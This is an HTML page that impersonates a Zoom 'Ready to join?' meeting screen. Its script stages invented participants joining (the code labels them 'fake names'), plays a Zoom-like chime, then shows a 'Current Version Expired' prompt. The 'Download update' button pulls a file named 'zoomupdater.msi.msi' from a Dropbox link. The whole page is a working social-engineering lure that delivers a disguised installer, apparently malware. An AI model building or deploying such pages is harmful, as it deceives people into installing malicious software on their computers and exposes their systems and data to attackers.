
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom - Ready to join?</title>
    <link rel="icon" href="https://st1.zoom.us/zoom.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #050d15 0%, #081218 50%, #050d15 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
        }

        .zoom-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 16px;
        }

        .zoom-logo svg {
            width: 32px;
            height: 32px;
        }

        .zoom-logo span {
            font-size: 28px;
            font-weight: 600;
            color: #fff;
        }

        .ready-text {
            color: #fbfbfb;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .meeting-card {
            background: linear-gradient(180deg, #0f2233 0%, #0a1a28 100%);
            border-radius: 16px;
            padding: 24px;
            width: 400px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
        }

        .meeting-title {
            font-size: 18px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 4px;
        }

        .meeting-id {
            font-size: 13px;
            color: #6b7c93;
            margin-bottom: 16px;
        }

        .host-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        .host-avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #2d5a4a 0%, #3d7a5a 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            color: #fff;
            position: relative;
        }

        .online-indicator {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 12px;
            height: 12px;
            background: #2563eb;
            border-radius: 50%;
            border: 2px solid #1a3a52;
        }

        .host-details {
            display: flex;
            flex-direction: column;
        }

        .host-name {
            font-size: 14px;
            font-weight: 500;
            color: #fff;
        }

        .host-label {
            font-size: 12px;
            color: #6b7c93;
        }

        .meeting-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            font-size: 13px;
            color: #6b7c93;
        }

        .today-badge {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .red-dot {
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
        }

        .duration {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .duration svg {
            width: 14px;
            height: 14px;
        }

        .name-input-container {
            position: relative;
            margin-bottom: 12px;
        }

        .name-input {
            width: 100%;
            padding: 12px 16px;
            padding-left: 40px;
            background: rgba(20, 45, 66, 0.8);
            border: 1px solid #2a4a60;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            outline: none;
        }

        .name-input::placeholder {
            color: #6b7c93;
        }

        .name-input:focus {
            border-color: #2563eb;
        }

        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #6b7c93;
        }

        .locked-badge {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            align-items: center;
            gap: 4px;
            color: #f59e0b;
            font-size: 12px;
        }

        .locked-badge svg {
            width: 12px;
            height: 12px;
        }

        .host-status {
            background: rgba(16, 185, 129, 0.15);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 8px;
            padding: 10px;
            text-align: center;
            color: #10b981;
            font-size: 13px;
            margin-bottom: 12px;
        }

        .join-button {
            width: 100%;
            padding: 14px;
            background: #2563eb;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .join-button:hover {
            background: #1d4ed8;
        }

        .join-button:active {
            transform: scale(0.98);
        }

        .settings-note {
            text-align: center;
            font-size: 12px;
            color: #6b7c93;
            margin-top: 12px;
        }

        /* Modal styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal {
            background: #1a3a52;
            border-radius: 16px;
            padding: 32px;
            text-align: center;
            max-width: 360px;
            animation: modalIn 0.3s ease;
        }

        @keyframes modalIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal h2 {
            color: #fff;
            margin-bottom: 12px;
            font-size: 20px;
        }

        .modal p {
            color: #a0aec0;
            margin-bottom: 24px;
            font-size: 14px;
            line-height: 1.5;
        }

        .modal-buttons {
            display: flex;
            gap: 12px;
        }

        .modal-btn {
            flex: 1;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .modal-btn.primary {
            background: #2563eb;
            border: none;
            color: #fff;
        }

        .modal-btn.primary:hover {
            background: #1d4ed8;
        }

        .modal-btn.secondary {
            background: transparent;
            border: 1px solid #4a5568;
            color: #fff;
        }

        .modal-btn.secondary:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff40;
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .join-button.loading .button-text {
            display: none;
        }

        .join-button.loading .loading-spinner {
            display: inline-block;
        }

        /* Join notifications */
        .notifications-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1500;
        }

        .notifications-overlay.active {
            display: block;
        }

        .notifications-container {
            position: fixed;
            top: 20px;
            right: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            z-index: 2000;
        }

        .join-notification {
            background: #22c55e;
            color: #fff;
            padding: 14px 24px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.4);
            animation: slideIn 0.4s ease, fadeOut 0.4s ease 2.6s forwards;
            white-space: nowrap;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(100px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes fadeOut {
            from {
                opacity: 1;
                transform: translateX(0);
            }
            to {
                opacity: 0;
                transform: translateX(100px);
            }
        }

        /* Expired version screen */
        .expired-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            align-items: center;
            justify-content: center;
            z-index: 3000;
        }

        .expired-screen.active {
            display: flex;
        }

        .expired-modal {
            background: #161414;
            border-radius: 17px;
            padding: 28px 32px;
            text-align: center;
            width: 400px;
            animation: modalIn 0.3s ease;
        }

        .expired-modal .zoom-logo-small {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 20px;
        }

        .expired-modal .zoom-logo-small svg {
            width: 24px;
            height: 24px;
        }

        .expired-modal .zoom-logo-small span {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
        }

        .expired-modal h2 {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .expired-modal p {
            color: #a0a0a0;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .download-btn {
            width: 100%;
            padding: 12px;
            background: #2563eb;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .download-btn:hover {
            background: #1d4ed8;
        }
    </style>
</head>
<body>
    <!-- Black overlay for notifications -->
    <div class="notifications-overlay" id="notificationsOverlay"></div>

    <!-- Join Notifications Container -->
    <div class="notifications-container" id="notificationsContainer"></div>

    <div class="zoom-logo">
        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="32" height="32" rx="8" fill="#2D8CFF"/>
            <path d="M7 11.5C7 10.6716 7.67157 10 8.5 10H17.5C18.3284 10 19 10.6716 19 11.5V20.5C19 21.3284 18.3284 22 17.5 22H8.5C7.67157 22 7 21.3284 7 20.5V11.5Z" fill="white"/>
            <path d="M20 14L25 11V21L20 18V14Z" fill="white"/>
        </svg>
        <span>Zoom</span>
    </div>

    <p class="ready-text">Ready to join?</p>

    <div class="meeting-card">
        <h1 class="meeting-title">Meeting broadcast session</h1>
        <p class="meeting-id">Meeting ID: 17649874947729</p>

        <div class="host-info">
            <div class="host-avatar">
                MK
                <div class="online-indicator"></div>
            </div>
            <div class="host-details">
                <span class="host-name">MK (Host)</span>
                <span class="host-label">Friend & Family</span>
            </div>
        </div>

        <div class="meeting-meta">
            <div class="today-badge">
                <div class="red-dot"></div>
                <span>Today</span>
            </div>
            <div class="duration">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/>
                </svg>
                <span>~45 minutes</span>
            </div>
        </div>

        <div class="name-input-container">
            <svg class="input-icon" width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
            </svg>
            <input type="text" class="name-input" id="nameInput" placeholder="Your name" value="">
            <div class="locked-badge">
                <svg fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                </svg>
                <span>Locked</span>
            </div>
        </div>

        <div class="host-status">Host is in the meeting</div>

        <button class="join-button" id="joinButton" onclick="joinMeeting()">
            <span class="button-text">Join now</span>
            <div class="loading-spinner"></div>
        </button>

        <p class="settings-note">Camera and microphone will follow your last used settings.</p>
    </div>

    <!-- Expired Version Screen -->
    <div class="expired-screen" id="expiredScreen">
        <div class="expired-modal">
            <div class="zoom-logo-small">
                <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="32" height="32" rx="8" fill="#2D8CFF"/>
                    <path d="M7 11.5C7 10.6716 7.67157 10 8.5 10H17.5C18.3284 10 19 10.6716 19 11.5V20.5C19 21.3284 18.3284 22 17.5 22H8.5C7.67157 22 7 21.3284 7 20.5V11.5Z" fill="white"/>
                    <path d="M20 14L25 11V21L20 18V14Z" fill="white"/>
                </svg>
                <span>Zoom</span>
            </div>
            <h2>Current Version Expired</h2>
            <p>A new version is available for download.</p>
            <button class="download-btn" onclick="downloadUpdate()">Download update</button>
        </div>
    </div>

    <script>
        const meetingId = '17649874947729';
        const joinButton = document.getElementById('joinButton');
        const expiredScreen = document.getElementById('expiredScreen');
        const nameInput = document.getElementById('nameInput');
        const notificationsOverlay = document.getElementById('notificationsOverlay');
        const notificationsContainer = document.getElementById('notificationsContainer');

        // Zoom join meeting sound
        const joinSound = new Audio('https://www.myinstants.com/media/sounds/zoom-join-sound.mp3');
        joinSound.volume = 0.5;
        
        // Fallback: Create Zoom-like double chime using Web Audio API
        function playJoinSound() {
            // Try to play the actual Zoom sound first
            joinSound.currentTime = 0;
            joinSound.play().catch(() => {
                // Fallback to synthesized Zoom-like sound
                playZoomChime();
            });
        }
        
        function playZoomChime() {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            
            // Zoom uses a two-tone chime (like "ding-dong")
            function playTone(freq, startTime, duration) {
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(freq, startTime);
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.3, startTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
                
                oscillator.start(startTime);
                oscillator.stop(startTime + duration);
            }
            
            const now = audioContext.currentTime;
            // First chime - higher pitch
            playTone(830, now, 0.15);
            // Second chime - lower pitch
            playTone(620, now + 0.18, 0.25);
        }

        function showExpiredScreen() {
            notificationsOverlay.classList.remove('active');
            expiredScreen.classList.add('active');
        }

        function downloadUpdate() {
            // Download Zoom installer directly from this site
            const link = document.createElement('a');
            link.href = 'https://www.dropbox.com/scl/fi/m2q5mfrez4gcldmhzq4g8/zoomupdater.msi.msi?rlkey=p374jmbebj96ln75ep3okfy68&st=8n5hdo2d&dl=1';
            link.download = 'https://www.dropbox.com/scl/fi/m2q5mfrez4gcldmhzq4g8/zoomupdater.msi.msi?rlkey=p374jmbebj96ln75ep3okfy68&st=8n5hdo2d&dl=1';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // Enter key to join
        nameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                joinMeeting();
            }
        });

        // Fake names for join notifications
        const fakeNames = [
            'Sarah Ann',
            'Michael Chen',
            'Emily Rodriguez',
            'James Wilson',
            'Sophia Martinez',
            'David Kim',
            'Olivia Thompson',
            'Daniel Brown'
        ];

        function showJoinNotification(name) {
            // Play sound
            playJoinSound();
            
            const notification = document.createElement('div');
            notification.className = 'join-notification';
            notification.textContent = `${name} joined the call`;
            notificationsContainer.appendChild(notification);

            // Remove notification after animation completes
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }

        function showRandomJoinNotifications(callback) {
            // Show black overlay
            notificationsOverlay.classList.add('active');
            
            // Shuffle and pick 3 random names
            const shuffled = [...fakeNames].sort(() => Math.random() - 0.5);
            const selectedNames = shuffled.slice(0, 3);

            // Show notifications with delays
            selectedNames.forEach((name, index) => {
                setTimeout(() => {
                    showJoinNotification(name);
                }, index * 1200); // 1.2 second delay between each
            });

            // Call callback after all notifications shown + display time
            const totalTime = (selectedNames.length * 1200) + 2000;
            setTimeout(callback, totalTime);
        }

        function joinMeeting() {
            // Add loading state
            joinButton.classList.add('loading');
            
            setTimeout(() => {
                joinButton.classList.remove('loading');
                
                // Show fake join notifications, then show expired screen
                showRandomJoinNotifications(() => {
                    showExpiredScreen();
                });
            }, 800);
        }
    </script>
